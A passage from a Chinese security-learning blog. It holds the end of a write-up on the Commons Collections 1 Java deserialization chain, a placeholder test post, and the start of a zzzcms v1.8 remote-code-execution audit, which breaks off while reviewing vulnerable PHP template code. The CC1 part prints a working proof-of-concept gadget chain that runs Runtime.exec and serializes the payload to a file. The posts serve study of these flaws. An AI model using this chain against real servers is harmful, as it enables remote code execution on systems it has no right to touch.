<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class,  Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class,  Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span>  Object[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer ChainedTransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        ChainedTransform.transform(<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//创建Map并绑定transformer</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map outermap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, ChainedTransform);</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        <span class="comment">//2.1可以直接map添加新值，触发漏洞</span></span><br><span class="line">        <span class="comment">//outermap.put(&quot;123&quot;, &quot;123&quot;);</span></span><br><span class="line">        <span class="comment">//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outermap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>寻找可触发ChainedTransformer对象.transform()方法的途径。<br>只要调用decorate（）函式，即可将键和值的变换函式Transformer<br>每当调用map的setValue方法时，setValue ==&gt; checkSetValue ==&gt; valueTransformer.transform(value)</p>
<p><img src="/2021/02/16/cc1%E9%93%BE/4.png" alt="4"></p>
<p>目前需要Map.Entry去调用setValue()，然后找某处可以反序列化的地方能调用setValue()方法，需要找到某处重写了readObject()方法，找到AnnotationInvocationHandler类实现如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String,  Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class)  &#123;</span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a  non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException,  ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField var2 = var1.readFields();</span><br><span class="line">    Class var3 = (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    Map var4 = (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial  stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Map var6 = var5.memberTypes();</span><br><span class="line">    LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext();  var7.put(var10, var11)) &#123;</span><br><span class="line">        Entry var9 = (Entry)var8.next();</span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="keyword">null</span>;</span><br><span class="line">        Class var12 = (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() +  <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, var3);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该类类成员变量memberValues是Map类型，readObject()函数中对于我们传入构造函数的map进行遍历赋值，memberValues.entrySet()的每一项调用了setValue()方法，目的达到。</p>
<p>最后poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;<span class="keyword">import</span> java.lang.annotation.Retention;<span class="keyword">import</span> java.lang.reflect.Constructor;<span class="keyword">import</span> java.util.HashMap;<span class="keyword">import</span> java.util.Map;<span class="keyword">import</span> org.apache.commons.collections.Transformer;<span class="keyword">import</span> org.apache.commons.collections.functors.*;<span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class,Class[].class&#125;,<span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span></span><br><span class="line">                        &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>,<span class="keyword">null</span></span><br><span class="line">                        &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class&#125;,<span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;calc.exe&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain= <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innermap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class cls = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Retention.class, outmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">&quot;temp.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用链如下</p>
<p><img src="/2021/02/16/cc1%E9%93%BE/5.png" alt="5"></p>
<p>命令执行点。参数可控通过反射实现RCE，漏洞起始点<br>利用链。服务器能反序列化我们的payload并一层一层进行调用<br>readObject复写点。和外部相连接并且能和利用链相连接即传入的数据能够通过该函数能够执行我们的利用链，漏洞终点。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7031(%E8%B7%9F%E7%9D%80%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E8%B5%B0%E7%9A%84)">https://xz.aliyun.com/t/7031(跟着这篇文章走的)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/02/13/test/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/ckrie.jpg">
      <meta itemprop="name" content="热爱篮球和安全的小伙子">
      <meta itemprop="description" content="记录我的学习之旅">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hungry and humble">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/13/test/" class="post-title-link" itemprop="url">test</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-02-13 12:02:53" itemprop="dateCreated datePublished" datetime="2021-02-13T12:02:53+08:00">2021-02-13</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-02-16 12:43:57" itemprop="dateModified" datetime="2021-02-16T12:43:57+08:00">2021-02-16</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p><font color="#dd0000">THIS IS TEST</font></p>
<p><img src="/2021/02/13/test/test.jpg" alt="1"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/02/13/zzzcms/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/ckrie.jpg">
      <meta itemprop="name" content="热爱篮球和安全的小伙子">
      <meta itemprop="description" content="记录我的学习之旅">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hungry and humble">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/13/zzzcms/" class="post-title-link" itemprop="url">zzzcms前台RCE</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-02-13 12:02:53" itemprop="dateCreated datePublished" datetime="2021-02-13T12:02:53+08:00">2021-02-13</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-02-14 13:35:26" itemprop="dateModified" datetime="2021-02-14T13:35:26+08:00">2021-02-14</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">PHP代码审计</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="zzzcms-最新版前台rce"><a href="#zzzcms-最新版前台rce" class="headerlink" title="zzzcms 最新版前台rce"></a>zzzcms 最新版前台rce</h1><p>弄了个博客发一篇文章来测试一下，这是十月份在公司审计的一个cms当时的最新版存在的一个可以shell的rce，有一个payload很有意思记得好像是参考的安全客的一篇文章，然后自己构造了一个payload也能打成功。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>1.首先到zzzcms的官网上下载zzzcms v1.8的安装包。</p>
<p>2.入口文件index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &#39;inc&#x2F;zzz_client.php&#39;;</span><br></pre></td></tr></table></figure>
<p>2.首先跟进zzz_client.php文件： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">require &#39;zzz_template.php&#39;;</span><br><span class="line">if (conf(&#39;webmode&#39;)&#x3D;&#x3D;0) error(conf(&#39;closeinfo&#39;));</span><br><span class="line">$location&#x3D;getlocation();</span><br><span class="line">ParseGlobal(G(&#39;sid&#39;),G(&#39;cid&#39;));</span><br><span class="line">&#x2F;&#x2F;echop($location);die;</span><br><span class="line">switch ($location) &#123;</span><br><span class="line">case &#39;about&#39;:</span><br><span class="line">$tplfile&#x3D; TPL_DIR . G(&#39;stpl&#39;);</span><br><span class="line">break;</span><br><span class="line">case &#39;brand&#39;:</span><br><span class="line">$stpl&#x3D;splits(db_select(&#39;brand&#39;,&#39;b_template&#39;,&quot;bid&#x3D;&quot;.G(&#39;bid&#39;) or &quot;b_name&#x3D;&#39;&quot;.G(&#39;bname&#39;).&quot;&#39;&quot;),&#39;,&#39;);</span><br><span class="line">if (defined(&#39;ISWAP&#39;))&#123;</span><br><span class="line">$tplfile&#x3D;isset($stpl[1]) ? $stpl[1] : $stpl[0];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$tplfile&#x3D;$stpl[0];</span><br><span class="line">&#125;</span><br><span class="line">$tplfile&#x3D;empty($tplfile) ? TPL_DIR .&#39;brand.html&#39; : TPL_DIR . $tplfile ;</span><br><span class="line">break;</span><br><span class="line">case &#39;brandlist&#39;:</span><br><span class="line">$tplfile&#x3D;isset($stpl) ? TPL_DIR . $stpl: TPL_DIR . &#39;brandlist.html&#39;;</span><br><span class="line">$GLOBALS[&#39;tid&#39;]&#x3D;&#39;-1&#39;;</span><br><span class="line">break;</span><br><span class="line">case &#39;content&#39;:</span><br><span class="line">$tplfile&#x3D; TPL_DIR . G(&#39;ctpl&#39;);</span><br><span class="line">break;</span><br><span class="line">case &#39;list&#39;:</span><br><span class="line">$tplfile&#x3D; TPL_DIR . G(&#39;stpl&#39;);</span><br><span class="line">break;</span><br><span class="line">case &#39;taglist&#39;:</span><br><span class="line">$tplfile&#x3D;TPL_DIR . &#39;taglist.html&#39;;</span><br><span class="line">$GLOBALS[&#39;tid&#39;]&#x3D;&#39;-1&#39;;</span><br><span class="line">break;</span><br><span class="line">case &#39;user&#39;:</span><br><span class="line">$tplfile&#x3D; TPL_DIR . &#39;user.html&#39;;</span><br><span class="line">break;</span><br><span class="line">case &#39;search&#39;:</span><br><span class="line">$tplfile&#x3D; TPL_DIR . &#39;search.html&#39;;</span><br><span class="line">break;</span><br><span class="line">define(&#39;TPL_DIR&#39;, SITE_DIR . &#39;template&#x2F;pc&#x2F;&#39;.PCTPL.$data[&#39;pchtmlpath&#39;]); 将需要载入的模板的路径赋值给$tplfile</span><br><span class="line">elseif($conf[&#39;runmode&#39;]&#x3D;&#x3D;0|| $conf[&#39;runmode&#39;]&#x3D;&#x3D;2 || $location&#x3D;&#x3D;&#39;search&#39; ||$location&#x3D;&#x3D;&#39;form&#39; ||$location&#x3D;&#x3D;&#39;screen&#39; || $location&#x3D;&#x3D;&#39;app&#39;)&#123;</span><br><span class="line">$zcontent &#x3D; load_file($tplfile,$location);</span><br><span class="line">$parser &#x3D; new ParserTemplate();</span><br><span class="line">$zcontent &#x3D; $parser-&gt;parserCommom($zcontent); &#x2F;&#x2F; 解析模板</span><br><span class="line">echo $zcontent;</span><br></pre></td></tr></table></figure>
<p>3.然后会解析需要的模板，也是漏洞开始的地方，然后跟进\zzzcms\inc\zzz_template.php的parserCommom函数，其内部实现如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">class ParserTemplate &#123;</span><br><span class="line">    &#x2F;&#x2F; 解析全局公共标签</span><br><span class="line">    public</span><br><span class="line">    function parserCommom( $zcontent ) &#123;</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserSiteLabel( $zcontent ); &#x2F;&#x2F; 站点标签</span><br><span class="line">        $zcontent &#x3D; $this-&gt;ParseInTemplate( $zcontent ); &#x2F;&#x2F; 模板标签</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserConfigLabel( $zcontent ); &#x2F;&#x2F;配置表情</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserSiteLabel( $zcontent ); &#x2F;&#x2F; 站点标签    </span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserNavLabel( $zcontent ); &#x2F;&#x2F; 导航标签 </span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserCompanyLabel( $zcontent ); &#x2F;&#x2F; 公司标签</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserUser( $zcontent ); &#x2F;&#x2F;会员信息           </span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserlocation( $zcontent ); &#x2F;&#x2F; 站点标签  &#123; </span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserLoopLabel( $zcontent ); &#x2F;&#x2F; 循环标签        </span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserContentLoop( $zcontent ); &#x2F;&#x2F; 指定内容</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserbrandloop( $zcontent );</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserGbookList( $zcontent );        </span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserLabel( $zcontent ); &#x2F;&#x2F; 指定内容</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserPicsLoop( $zcontent ); &#x2F;&#x2F; 内容多图</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserad( $zcontent );</span><br><span class="line">        $zcontent &#x3D; parserPlugLoop( $zcontent );</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserOtherLabel( $zcontent );</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserIfLabel( $zcontent ); &#x2F;&#x2F; IF语句  漏洞点</span><br><span class="line">        $zcontent &#x3D; $this-&gt;parserNoLabel( $zcontent );</span><br><span class="line">        return $zcontent;</span><br><span class="line">&#125;</span><br><span class="line">…</span><br><span class="line">…&#x2F;&#x2F;  此处省略</span><br><span class="line">…</span><br><span class="line">…</span><br><span class="line">    private function parserlocation( $zcontent ) &#123;</span><br><span class="line">        $location &#x3D; G( &#39;location&#39; );</span><br><span class="line">        switch ( $location ) &#123;</span><br><span class="line">            case &#39;about&#39;:</span><br><span class="line">                $zcontent &#x3D; $this-&gt;parserAbout( $zcontent );</span><br><span class="line">                break;</span><br><span class="line">            case &#39;brand&#39;:</span><br><span class="line">                $zcontent &#x3D; $this-&gt;parserBrand( $zcontent );</span><br><span class="line">                break;</span><br><span class="line">            case &#39;content&#39;:</span><br><span class="line">                $zcontent &#x3D; $this-&gt;parserContent( $zcontent );</span><br><span class="line">                break;</span><br><span class="line">            case &#39;search&#39;:</span><br><span class="line">                $zcontent &#x3D; $this-&gt;parserSearch( $zcontent );&#x2F;&#x2F;</span><br><span class="line">                break;</span><br><span class="line">            case &#39;sublist&#39;:</span><br><span class="line">            case &#39;list&#39;:</span><br><span class="line">                $zcontent &#x3D; $this-&gt;parserList( $zcontent );</span><br><span class="line">                break;</span><br><span class="line">            case &#39;taglist&#39;:</span><br><span class="line">                $tag &#x3D; db_select( &#39;tag&#39;, &#39;t_name&#39;, &quot;t_enname&#x3D;&#39;&quot; . G( &#39;sid&#39; ) . &quot;&#39;&quot; );</span><br><span class="line">                $tag &#x3D; isset( $tag ) ? $tag : &#39;无效&#39;;</span><br><span class="line">                $zcontent &#x3D; str_replace( &#39;&#123;zzz:tag&#125;&#39;, $tag, $zcontent );</span><br><span class="line">                $zcontent &#x3D; $this-&gt;parserList( $zcontent );</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">        return $zcontent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>4.跟进parserlocation()函数，当$location的值为’search’时，调用parsersearch函数后函数返回$zcontent，然后渲染成HTML，因此重点关注parsersearch函数，其主要实现如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function parserSearch( $zcontent ) &#123;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;\&#123;zzz:search(\s+[^&#125;]+)?\&#125;([\s\S]*?)\&#123;\&#x2F;zzz:search\&#125;&#x2F;&#39;;</span><br><span class="line">    $pattern2 &#x3D; &#39;&#x2F;\[search:([\w]+)(\s+[^]]+)?\]&#x2F;&#39;;</span><br><span class="line">    if ( preg_match_all( $pattern, $zcontent, $matches ) ) &#123;</span><br><span class="line">        $count &#x3D; count( $matches[ 0 ] );</span><br><span class="line">        for ( $i &#x3D; 0; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            &#x2F;&#x2F; 获取调节参数</span><br><span class="line">            $params &#x3D; parserParam( $matches[ 1 ][ $i ] );</span><br><span class="line">            $where &#x3D; array( &#39;C_onoff&#39; &#x3D;&gt; 1 );$whereor&#x3D;&#39;&#39;;$type&#x3D;&#39;&#39;;</span><br><span class="line">            $colnum &#x3D; conf( &#39;pagesize&#39; );</span><br><span class="line">            $order &#x3D; array( 